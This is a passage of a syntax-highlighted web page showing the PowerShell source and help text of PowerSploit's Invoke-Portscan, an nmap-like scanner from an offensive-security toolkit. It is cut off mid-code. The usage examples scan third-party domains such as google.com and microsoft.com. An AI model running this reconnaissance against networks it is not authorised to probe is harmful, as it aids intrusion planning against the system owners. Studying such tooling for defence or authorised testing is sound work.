class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Invoke-Portscan</span></span><br>&#123;<br><span class="hljs-comment">&lt;#</span><br><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Simple portscan module</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PowerSploit Function: Invoke-Portscan</span><br><span class="hljs-comment">Author: Rich Lundeen (http://webstersProdigy.net)</span><br><span class="hljs-comment">License: BSD 3-Clause</span><br><span class="hljs-comment">Required Dependencies: None</span><br><span class="hljs-comment">Optional Dependencies: None</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.DESCRIPTION</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Does a simple port scan using regular sockets, based (pretty) loosely on nmap</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Hosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include these comma seperated hosts (supports IPv4 CIDR notation) or pipe them in</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER HostFile</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Input hosts from file rather than commandline</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ExcludeHosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Exclude these comma seperated hosts</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Ports</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include these comma seperated ports (can also be a range like 80-90)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER PortFile</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Input ports from a file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER TopPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include the x top ports - only goes to 1000, default is top 50</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ExcludedPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Exclude these comma seperated ports</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SkipDiscovery</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Treat all hosts as online, skip host discovery</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER PingOnly</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Ping scan only (disable port scan)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER DiscoveryPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Comma separated ports used for host discovery. -1 is a ping</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Threads</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">number of max threads for the thread pool (per host)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER nHosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">number of hosts to concurrently scan</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Timeout</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Timeout time on a connection in miliseconds before port is declared filtered</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SleepTimer</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Wait before thread checking, in miliseconds</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SyncFreq</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">How often (in terms of hosts) to sync threads and flush output</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER T</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">[0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout)</span><br><span class="hljs-comment">    5 &#123;$nHosts=30;  $Threads = 1000; $Timeout = 750  &#125;</span><br><span class="hljs-comment">    4 &#123;$nHosts=25;  $Threads = 1000; $Timeout = 1200 &#125;</span><br><span class="hljs-comment">    3 &#123;$nHosts=20;  $Threads = 100;  $Timeout = 2500 &#125;</span><br><span class="hljs-comment">    2 &#123;$nHosts=15;  $Threads = 32;   $Timeout = 3000 &#125;</span><br><span class="hljs-comment">    1 &#123;$nHosts=10;  $Threads = 32;   $Timeout = 5000 &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER GrepOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Greppable output file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER XmlOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output XML file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ReadableOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output file in &#x27;readable&#x27; format</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER AllformatsOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output in readable (.nmap), xml (.xml), and greppable (.gnmap) formats</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER noProgressMeter</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Suppresses the progress meter</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER quiet</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">supresses returned output and don&#x27;t store hosts in memory - useful for very large scans</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ForceOverwrite</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Force Overwrite if output Files exist. Otherwise it throws exception</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Invoke-Portscan -Hosts &quot;webstersprodigy.net,google.com,microsoft.com&quot; -TopPorts 50</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Scans the top 50 ports for hosts found for webstersprodigy.net,google.com, and microsoft.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">echo webstersprodigy.net | Invoke-Portscan -oG test.gnmap -f -ports &quot;80,443,8080&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Does a portscan of &quot;webstersprodigy.net&quot;, and writes a greppable output file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25 -oA localnet</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Scans the top 20 ports for hosts found in the 192.168.1.1/24 range, outputs all file formats</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.LINK</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">http://webstersprodigy.net</span><br><span class="hljs-comment">#&gt;</span><br><br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseShouldProcessForStateChangingFunctions&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseSingularNouns&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseApprovedVerbs&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSShouldProcess&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseLiteralInitializerForHashtable&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    <span class="hljs-function">[<span class="hljs-type">CmdletBinding</span>()]</span><br>    <span class="hljs-keyword">Param</span> (<br>        <span class="hljs-comment">#Host, Ports</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;cmdHosts&quot;</span>,<br><br>                   <span class="hljs-type">ValueFromPipeline</span>=<span class="hljs-variable">$True</span>,<br>                   <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                   [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$Hosts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;fHosts&quot;</span>,<br>                   <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;iL&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>]  <span class="hljs-variable">$HostFile</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;exclude&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ExcludeHosts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;p&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Ports</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;iP&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$PortFile</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$TopPorts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;xPorts&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ExcludedPorts</span>,<br><br>        <span class="hljs-comment">#Host Discovery</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;Pn&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;sn&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$PingOnly</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;PS&quot;</span>)]<br>                   [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$DiscoveryPorts</span> = <span class="hljs-string">&quot;-1,445,80,443&quot;</span>,<br><br>        <span class="hljs-comment">#Timing and Performance</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Threads</span> = <span class="hljs-number">100</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$nHosts</span> = <span class="hljs-number">25</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">2000</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$SleepTimer</span> = <span class="hljs-number">500</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$SyncFreq</span> = <span class="hljs-number">1024</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$T</span>,<br><br>        <span class="hljs-comment">#Output</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oG&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$GrepOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oX&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$XmlOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oN&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ReadableOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oA&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$AllformatsOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$noProgressMeter</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;q&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$quiet</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;F&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$ForceOverwrite</span><br><br>        <span class="hljs-comment">#TODO add script parameter</span><br>        <span class="hljs-comment">#TODO add resume parameter</span><br>    )<br><br>    <span class="hljs-keyword">PROCESS</span> &#123;<br><br>        <span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2.0</span><br><br>        <span class="hljs-variable">$version</span> = .<span class="hljs-number">13</span><br>        <span class="hljs-variable">$hostList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>        <span class="hljs-variable">$portList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>        <span class="hljs-variable">$hostPortList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br><br>        <span class="hljs-variable">$scannedHostList</span> = <span class="hljs-selector-tag">@</span>()<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-Hosts</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Hosts</span><br>            )<br><br>            [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$iHosts</span> = <span class="hljs-variable">$Hosts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-variable">$IPRangeRegex</span> = <span class="hljs-string">&quot;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;-\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;&quot;</span><br><br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$iHosts</span>)<br>            &#123;<br>                <span class="hljs-variable">$iHost</span> = <span class="hljs-variable">$iHost</span>.Replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$iHost</span>)<br>                &#123;<br>                    <span class="hljs-keyword">continue</span><br>                &#125;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$iHost</span>.contains(<span class="hljs-string">&quot;/&quot;</span>))<br>                &#123;<br>                    <span class="hljs-variable">$netPart</span> = <span class="hljs-variable">$iHost</span>.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>]<br>                    [<span class="hljs-type">uint32</span>]<span class="hljs-variable">$maskPart</span> = <span class="hljs-variable">$iHost</span>.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">1</span>]<br><br>                    <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>]::Parse(<span class="hljs-variable">$netPart</span>)<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$maskPart</span> <span class="hljs-operator">-ge</span> <span class="hljs-variable">$address</span>.GetAddressBytes().Length * <span class="hljs-number">8</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Bad host mask&quot;</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$numhosts</span> = [<span class="hljs-type">System.math</span>]::Pow(<span class="hljs-number">2</span>,((<span class="hljs-variable">$address</span>.GetAddressBytes().Length *<span class="hljs-number">8</span>) - <span class="hljs-variable">$maskPart</span>))<br><br>                    <span class="hljs-variable">$startaddress</span> = <span class="hljs-variable">$address</span>.GetAddressBytes()<br>                    [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$startaddress</span>)<br><br>                    <span class="hljs-variable">$startaddress</span> = [<span class="hljs-type">System.BitConverter</span>]::ToUInt32(<span class="hljs-variable">$startaddress</span>, <span class="hljs-number">0</span>)<br>                    [<span class="hljs-type">uint32</span>]<span class="hljs-variable">$startMask</span> = ([<span class="hljs-type">System.math</span>]::Pow(<span class="hljs-number">2</span>, <span class="hljs-variable">$maskPart</span>)<span class="hljs-literal">-1</span>) * ([<span class="hljs-type">System.Math</span>]::Pow(<span class="hljs-number">2</span>,(<span class="hljs-number">32</span> - <span class="hljs-variable">$maskPart</span>)))<br>                    <span class="hljs-variable">$startAddress</span> = <span class="hljs-variable">$startAddress</span> <span class="hljs-operator">-band</span> <span class="hljs-variable">$startMask</span><br><br>                    <span class="hljs-comment">#in powershell 2.0 there are 4 0 bytes padded, so the [0..3] is necessary</span><br>                    <span class="hljs-variable">$startAddress</span> = [<span class="hljs-type">System.BitConverter</span>]::GetBytes(<span class="hljs-variable">$startaddress</span>)[<span class="hljs-number">0</span><span class="hljs-type">..3</span>]<br>                    [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$startaddress</span>)<br><br>                    <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>] [<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$startAddress</span><br><br>                    <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$address</span>.IPAddressToString)<br><br>                    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$numhosts</span><span class="hljs-literal">-1</span>; <span class="hljs-variable">$i</span>++)<br>                    &#123;<br><br>                        <span class="hljs-variable">$nextAddress</span> =  <span class="hljs-variable">$address</span>.GetAddressBytes()<br>                        [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$nextAddress</span>)<br>                        <span class="hljs-variable">$nextAddress</span> =  [<span class="hljs-type">System.BitConverter</span>]::ToUInt32(<span class="hljs-variable">$nextAddress</span>, <span class="hljs-number">0</span>)<br>                        <span class="hljs-variable">$nextAddress</span> ++<br>                        <span class="hljs-variable">$nextAddress</span> = [<span class="hljs-type">System.BitConverter</span>]::GetBytes(<span class="hljs-variable">$nextAddress</span>)[<span class="hljs-number">0</span><span class="hljs-type">..3</span>]<br>                        [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$nextAddress</span>)<br><br>                        <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>] [<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$nextAddress</span><br>                        <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$address</span>.IPAddressToString)<br><br>                    &#125;<br><br>                &#125;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-operator">-match</span> <span class="hljs-variable">$IPRangeRegex</span>)<br>                &#123;<br><br>                <span class="hljs-variable">$iHostPart1</span> = (<span class="hljs-variable">$iHost</span>.Split(<span class="hljs-string">&quot;-&quot;</span>))[<span class="hljs-number">0</span>]<br>                <span class="hljs-variable">$iHostPart2</span> = (<span class="hljs-variable">$iHost</span>.Split(<span class="hljs-string">&quot;-&quot;</span>))[<span class="hljs-number">1</span>]<br><br>                <span class="hljs-variable">$LowerBound</span> = <span class="hljs-variable">$iHostPart1</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)<br>                <span class="hljs-variable">$UpperBound</span> = <span class="hljs-variable">$iHostPart2</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)<br><br>                <span class="hljs-variable">$LowerBoundInt</span> = (<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">0</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">1</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">2</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">3</span>].ToInt32(<span class="hljs-variable">$null</span>))<br>                <span class="hljs-variable">$UpperBoundInt</span> = (<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">0</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">1</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">2</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">3</span>].ToInt32(<span class="hljs-variable">$null</span>))<br><br>                <span class="hljs-variable">$CurrentIP</span> = <span class="hljs-variable">$LowerBoundInt</span><br>                <span class="hljs-variable">$CurrentIPString</span> = <span class="hljs-variable">$null</span><br>                <span class="hljs-variable">$ControlArray</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br>                <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$iHostPart1</span>)<br><br>                    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$CurrentIPString</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$iHostPart2</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">4</span>;<span class="hljs-variable">$i</span>++)<br>                        &#123;<br><br>                            <span class="hljs-keyword">if</span>((<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>] <span class="hljs-operator">-eq</span> <span class="hljs-variable">$UpperBoundInt</span>[<span class="hljs-variable">$i</span>]) <span class="hljs-operator">-and</span> ((<span class="hljs-variable">$i</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-or</span> <span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span>))<br>                            &#123;<br>                                <span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-number">1</span><br>                                <span class="hljs-keyword">continue</span><br>                            &#125;<br>                            <span class="hljs-keyword">else</span><br>                            &#123;<br><br>                                <span class="hljs-variable">$Max</span> = <span class="hljs-number">254</span><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$Max</span> = <span class="hljs-variable">$UpperBoundInt</span>[<span class="hljs-variable">$i</span>]<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">3</span>) <span class="hljs-operator">-and</span> (<span 